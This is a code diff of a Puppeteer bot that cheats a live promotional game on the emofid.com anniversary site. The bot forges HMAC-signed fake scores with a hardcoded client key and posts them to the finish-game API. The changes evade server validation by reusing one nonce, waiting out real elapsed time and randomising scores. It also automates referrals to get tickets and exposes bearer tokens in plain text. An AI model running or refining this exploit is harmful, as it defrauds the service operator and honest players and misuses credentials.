@@ -2,16 +2,15 @@ const puppeteer = require('puppeteer');
 
 // ============ CONFIGURATION ============
 const CONFIG = {
-  // token: '484638|uJlGdPeHUN4AO8lUwmKswtgCwGZZtiWZe5NA1zys2b600eb8',
-  token: '481462|R0AUevlJJioDog1Ky2qLknA5ysddOu0l2P90Muj9b88d1a3d',
-  targetScore: 550000000,        // Stop when total score reaches this
-  delayMin: 70,                // Minimum delay between runs (seconds)
-  delayMax: 120,                // Maximum delay between runs (seconds)
-  scoreMin: 7000000,            // Minimum fake score per game
-  scoreMax: 9000000,           // Maximum fake score per game
+  token: '505476|gJ2rpon2kgvDABZP86I9E2eRHd1mSh0BUAPBXYBie6e9ae53',
+  targetScore: 46000000,        // Stop when total score reaches this
+  delayMin: 10,                // Minimum delay between runs (seconds)
+  delayMax: 30,                // Maximum delay between runs (seconds)
+  scoreMin: 10000,            // Minimum fake score per game
+  scoreMax: 30000,           // Maximum fake score per game
   scoreStep: 500,              // Score must be multiple of this
-  durationMin: 0,             // Min game duration to report
-  durationMax: 0,             // Max game duration to report
+  durationMin: 30,            // Min game duration to report (seconds)
+  durationMax: 60,           // Max game duration to report (seconds)
   headless: false,             // Set true to run without browser window
 };
 
@@ -62,11 +61,19 @@ async function getUserScore(page, token) {
 }
 
 // ============ EXPLOIT SCRIPT (runs in browser) ============
-const exploitScript = (score, duration, token) => `
+// Uses actual elapsed time and same nonce for both Score and Cat
+const exploitScript = (score, token, gameStartTime) => `
 (async () => {
   const A40_NINAI = 'A40@2025-ASDasd!@#123CCCvvvaaa';
 
-  async function fakeScore(points) {
+  // Calculate actual elapsed time since game started
+  const duration = (Date.now() - ${gameStartTime}) / 1000;
+  const cat = Math.floor(duration * 0.97);
+
+  // Use SAME nonce for both Score and Cat (server validates this)
+  const nonce = Date.now().toString();
+
+  async function encodeValueWithNonce(value, nonce) {
     const encoder = new TextEncoder();
     const key = await crypto.subtle.importKey(
       'raw',
@@ -76,8 +83,7 @@ const exploitScript = (score, duration, token) => `
       ['sign']
     );
 
-    const nonce = Date.now().toString();
-    const payload = points + '.' + nonce;
+    const payload = value + '.' + nonce;
     const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(payload));
     const hex = Array.from(new Uint8Array(signature))
       .map(b => b.toString(16).padStart(2, '0')).join('');
@@ -85,24 +91,26 @@ const exploitScript = (score, duration, token) => `
     return btoa(payload + '.' + hex);
   }
 
-  const fakePoints = await fakeScore(${score});
+  const fakePoints = await encodeValueWithNonce(${score}, nonce);
+  const fakeCat = await encodeValueWithNonce(cat, nonce);
 
   const response = await fetch('https://landing.emofid.com/api-service/anniversary40/finish-game/', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
-      'Authorization': 'Bearer ${token}'
+      'Authorization': 'Bearer ${token}',
+      'what': fakeCat
     },
     credentials: 'include',
     body: JSON.stringify({
       points_earned: fakePoints,
       mission_name: 'rocket',
-      duration: ${duration}
+      duration: duration
     })
   });
 
   const result = await response.json();
-  return result;
+  return { ...result, duration, cat };
 })();
 `;
 
@@ -169,12 +177,12 @@ async function runBot() {
     console.log(`\n========== GAME ${gameCount} | Total: ${totalScore.toLocaleString()} / ${targetScore.toLocaleString()} (${remaining.toLocaleString()} remaining) ==========`);
 
     try {
-      // Generate random score and duration
+      // Generate random score and target wait time
       const score = randomInt(CONFIG.scoreMin, CONFIG.scoreMax, CONFIG.scoreStep);
-      const duration = randomInt(CONFIG.durationMin, CONFIG.durationMax);
+      const targetDuration = randomInt(CONFIG.durationMin, CONFIG.durationMax);
 
-      console.log(`📊 Score: ${score.toLocaleString()}`);
-      console.log(`⏱️  Duration: ${duration}s`);
+      console.log(`📊 Target Score: ${score.toLocaleString()}`);
+      console.log(`⏱️  Target Duration: ${targetDuration}s`);
 
       // Do 1 referral to get ticket
       console.log('🎫 Getting ticket via referral...');
@@ -196,11 +204,11 @@ async function runBot() {
       console.log('🎮 Clicking start game button...');
       await page.waitForSelector('button[aria-label*="شروع بازی شاتل فضایی"]', { timeout: 30000 });
 
-      // Set up listener for can-start API before clicking (without trailing slash)
+      // Set up listener for can-start API before clicking
       const canStartPromise = page.waitForResponse(
         response => response.url().includes('/api-service/anniversary40/can-start') && response.status() === 200,
         { timeout: 30000 }
-      ).catch(() => null);  // Don't fail if timeout
+      ).catch(() => null);
 
       await page.click('button[aria-label*="شروع بازی شاتل فضایی"]');
 
@@ -208,9 +216,13 @@ async function runBot() {
       console.log('⏳ Waiting for game iframe to load...');
       await page.waitForSelector('iframe[src*="games/rocket"]', { timeout: 15000 });
 
-      // Wait for can-start API to complete (but continue even if timeout)
+      // Wait for can-start API to complete
       console.log('⏳ Waiting for game to initialize (can-start API)...');
       const canStartResult = await canStartPromise;
+
+      // Record the ACTUAL start time (this is crucial for the exploit)
+      const gameStartTime = Date.now();
+
       if (canStartResult) {
         console.log('✅ Game initialized!');
       } else {
@@ -228,12 +240,17 @@ async function runBot() {
         continue;
       }
 
-      // Execute exploit in iframe context
+      // Wait for the target duration (server validates actual elapsed time)
+      console.log(`⏳ Waiting ${targetDuration} seconds (server validates elapsed time)...`);
+      await sleep(targetDuration * 1000);
+
+      // Execute exploit in iframe context with actual start time
       console.log('💉 Executing exploit...');
-      const result = await gameFrame.evaluate(exploitScript(score, duration, token));
+      const result = await gameFrame.evaluate(exploitScript(score, token, gameStartTime));
 
       if (result && result.success) {
         console.log(`✅ Success: +${score.toLocaleString()} points`);
+        console.log(`   Duration: ${result.duration?.toFixed(2)}s | Cat: ${result.cat}`);
         // Get actual score from API
         totalScore = await getUserScore(page, token);
         console.log(`📈 Total (from site): ${totalScore.toLocaleString()} / ${targetScore.toLocaleString()}`);
